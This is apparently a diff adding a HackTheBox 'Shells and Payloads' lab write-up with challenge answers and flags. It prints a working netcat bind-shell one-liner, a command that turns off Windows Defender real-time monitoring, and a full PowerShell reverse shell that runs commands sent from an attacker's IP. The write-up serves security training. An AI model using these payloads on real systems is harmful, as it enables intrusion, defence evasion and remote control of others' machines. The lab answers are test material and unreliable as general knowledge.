@@ -1,1 +1,78 @@
 # HTB-Shells_and_Payloads
+
+## Table of Contents
+1. [Shell Basics](#shell-basics)
+    1. [Anatomy of a Shell](#anatomy-of-a-shell)
+    2. [Bind Shells](#bind-shells)
+    3. [Reverse Shells](#reverse-shells)
+
+## Shell Basics
+### Anatomy of a Shell
+#### Challenges
+1. Which two shell languages did we experiment with in this section? (Format: shellname&shellname)
+
+    The answer is `bash&powershell`.
+
+2. In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer
+
+    We just need to type `$PSversiontable`. The answer is `Core`.
+
+### Bind Shells
+#### Payload
+1. Binding a Bash shell to the TCP session
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+#### Challenges
+1. Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?
+
+    The answer is `443`.
+
+2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.
+
+    First we need ssh to the target. Then we use this payload.
+    ```bash
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.180.140 7777 > /tmp/f
+    ```
+
+    After that, from our client, we can connect to that port using nc.
+
+    ```bash
+    nc -nv 10.129.180.140 7777 
+    ```
+
+    From there we can read the flag. The answer is `B1nD_Shells_r_cool`.
+
+### Reverse Shells
+#### Tools
+1. [Reverse Shell CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+2. Windows Reverse Shell Common Payload
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+#### Challenges
+1. When establishing a reverse shell session with a target, will the target act as a client or server?
+
+    The answer is `client`.
+
+2. Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.
+
+    In the our terminal, we open netcat first.
+    ```bash
+    sudo nc -lvnp 443
+    ```
+
+    Then we need to rdp to the target. After that we disable the Windows Defender antivirus by run this payload on the powershell admin previllege.
+
+    ```powershell
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    ```
+
+    And then we use this payload into cmd.
+
+    ```cmd
+    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.234',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    ```
+
+    After that we can type `hostname` in the our terminal. The answer is `Shells-Win10`.
